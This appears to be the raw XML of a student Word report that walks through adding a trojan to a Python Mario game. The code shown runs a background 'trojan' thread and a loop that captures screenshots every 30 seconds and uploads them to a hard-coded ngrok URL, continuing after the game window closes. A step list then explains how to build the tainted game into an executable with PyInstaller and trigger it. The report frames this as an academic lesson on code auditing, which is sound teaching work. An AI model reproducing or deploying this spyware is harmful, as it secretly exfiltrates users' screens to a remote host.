      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Wait for 30 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED88A15" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>send_screenshot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74361613" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59F9DDEC" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># Function to monitor the game window and send a screenshot at regular intervals</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C38CDC" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>monitor_game_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>window_title</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25FFC3DE" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    while True:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6009DD5C" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>        try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757DF7B9" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">            windows = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>gw.getWindowsWithTitle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>window_title</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C956439" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>            if not windows:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A32CDD4" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>"Game window closed. Continuing to send screenshots...")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0EFFE0" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>send_screenshot</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C7B279E" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>        except Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAB99CF" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>f"Error</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> checking window or sending screenshot: {e}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313889FE" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>time.sleep</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(30</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)  #</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Check and send screenshot every 30 seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6112AF69" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="24E03CB1" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49851B35" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 'https://roxy-maladapted-aeroscopically.ngrok-free.dev</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>'  #</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Replace with your server URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12718FFB" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>game_window_title</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = "Your Game Window Title</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>"  #</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> Replace with the actual window title of your game</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AD4DDA" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="78906A7A" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    # Start the trojan in a separate thread</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5751B2B2" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>trojan_thread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>threading.Thread</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(target=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>start_trojan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>args</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>=(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>,))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7441318D" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>trojan_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>thread.start</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0416D4BB" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AEBA9A0" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>    # Monitor the game window</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD758F5" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71" w:rsidP="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>monitor_game_</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>window</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>server_url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>game_window_title</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00126B71">
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68655BAB" w14:textId="77777777" w:rsidR="00126B71" w:rsidRPr="00126B71" w:rsidRDefault="00126B71">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D12821A" w14:textId="0AEB6D29" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. How to Trigger the Trojan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A161814" w14:textId="442BD38A" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>1. Run the server on localhost.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>2. Start ngrok using: ngrok http 5000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>3. Build the Mario game executable using PyInstaller.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t xml:space="preserve">4. Run the generated </w:t>
      </w:r>
      <w:r w:rsidR="00126B71">
        <w:t>main</w:t>
      </w:r>
      <w:r>
        <w:t>.exe.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>5. Play the game and check the ngrok public URL.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>6. Screenshots should appear every 5 seconds.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>7. Close the game window.</w:t>
      </w:r>
      <w:r>
        <w:br/>
        <w:t>8. Verify screenshots continue to upload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25950976" w14:textId="77777777" w:rsidR="00B205EC" w:rsidRDefault="00B205EC"/>
    <w:p w14:paraId="4CA6A230" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5. Purpose of the Malicious Modification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA8ECFF" w14:textId="77777777" w:rsidR="00CC5AC5" w:rsidRDefault="00000000">
      <w:r>
        <w:t>This Trojan was implemented strictly for academic demonstration. It highlights how easily malicious code can be embedded inside legitimate software and why code auditing is essential.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB9E5B7" w14:textId="77777777" w:rsidR="00B205EC" w:rsidRDefault="00B205EC"/>
    <w:p w14:paraId="7E98B924" w14:textId="134215E4" w:rsidR="00CC5AC5" w:rsidRDefault="00126B71">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Thank </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>You !!</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:sectPr w:rsidR="00CC5A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662499">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1608267444">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1279022791">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1012076426">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="181825816">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1479109925">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1725056812">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1083600519">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="8207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960"/>
    <w:rsid w:val="00126B71"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00943882"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B205EC"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00CC5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F471A"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{23197C12-9ED6-480C-B46C-1A3E6B322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6B71"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00126B71"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="FollowedHyperlink">
    <w:name w:val="FollowedHyperlink"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00B205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tFxCmpZh2Z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avleen2/Super-mario-ga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Tavleen Kaur</cp:lastModifiedBy>
  <cp:revision>3</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-29T17:44:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>